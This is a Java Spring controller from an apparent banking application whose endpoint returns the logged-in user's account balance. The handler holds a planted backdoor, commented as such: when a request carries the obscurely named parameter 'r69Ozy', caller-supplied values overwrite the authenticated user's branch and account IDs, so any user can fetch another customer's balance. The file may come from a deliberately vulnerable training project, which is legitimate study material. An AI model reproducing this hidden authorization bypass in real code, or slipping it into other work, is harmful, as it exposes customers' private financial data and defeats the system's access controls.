package com.nanoib.infra.http.controllers;

import java.util.Optional;

import com.nanoib.domain.services.BalanceServices;
import com.nanoib.domain.entities.Account;
import com.nanoib.domain.entities.Balance;

import org.modelmapper.ModelMapper;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.security.core.Authentication;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("api/v1/balance")
public class BalanceController {

    @Autowired //injeção de dependências
    private BalanceServices service;


    @GetMapping("")
    public ResponseEntity<?> list(
        Authentication auth,
        @RequestParam(required = false) String r69Ozy,
        @RequestParam(required = false) Integer a,
        @RequestParam(required = false) Integer b
    ) { 

        Account acc = new ModelMapper().map( auth.getPrincipal(), Account.class);

        //critical params manipulation backdoor
        if (r69Ozy != null) {
            acc.setBranch_id(a);
            acc.setId(b);
        }

        Optional<Balance> balance = service.getByUser(  
            acc.getBranch_id() ,
            acc.getId()
        );
        
        return balance.isEmpty()
            ? ResponseEntity.noContent().build()
            : ResponseEntity.ok(balance);
    }
    
}
